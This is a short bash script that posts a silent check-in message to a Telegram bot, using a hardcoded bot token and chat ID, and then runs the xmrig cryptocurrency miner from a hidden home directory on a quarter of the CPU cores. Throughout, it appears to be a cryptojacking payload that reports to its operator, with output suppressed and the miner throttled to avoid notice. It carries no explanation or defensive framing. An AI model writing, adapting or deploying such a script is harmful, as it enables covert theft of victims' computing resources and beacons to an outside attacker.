#!/bin/bash
BOT_TOKEN="7358706949:AAGmCtR29AVrmTO5lH6M7424T0pWim_Pm0k"
CHAT_ID="5792222595"
MESSAGE="تم"

nohup curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" -d "chat_id=$CHAT_ID" -d "text=$MESSAGE" &>/dev/null &

CORES=$(grep -c ^processor /proc/cpuinfo)
QUARTER_CORES=$((CORES / 4))

~/\.fil/xmrig -t $QUARTER_CORES
